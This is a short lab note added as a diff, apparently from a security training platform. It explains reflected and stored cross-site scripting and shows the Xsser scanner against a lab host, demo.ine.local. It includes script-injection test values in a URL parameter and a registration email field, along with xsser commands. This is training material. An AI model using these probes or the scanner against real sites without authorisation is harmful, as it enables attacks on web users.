@@ -1,0 +1,37 @@
+
+The "Xsser" is a tool to find an XSS vulnerability in the application..
+
+"Xsser" is a tool commonly used for finding and exploiting cross-site scripting (XSS) vulnerabilities in web applications. Here, we can see the important options, such as "-u," which is used to specify the URL, and "-g," which sends the payload using the GET method.
+
+Reflected cross-site scripting (XSS) occurs when an attacker injects malicious code into a website, and that code is immediately sent back to users by the web server. The injected code is then executed in the users' browsers, potentially leading to unauthorized actions, data theft, or manipulation of the displayed content. Here, the user-injected malicious code is not stored on the server.
+Stored Cross-Site Scripting (XSS) involves an attacker injecting malicious code into a web application. This code is permanently stored on the server and served to users when they access a specific page or resource. The injected code executes in user's browsers, enabling various malicious actions.
+
+
+Website: demo.ine.local/profile/1?name=John+Doe
+
+demo.ine.local/profile/1?name=<script>alert("XSS")</script>
+
+Email: <script>alert("XSS")</script>
+Name: demo
+Password: demo
+Mobile: 1234
+Address: abc
+
+
+xsser -h
+xsser -u "http://demo.ine.local" -g "/profile/1?name=John+Doe"
+xsser -u "http://demo.ine.local" -g "/profile/1?name=XSS"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
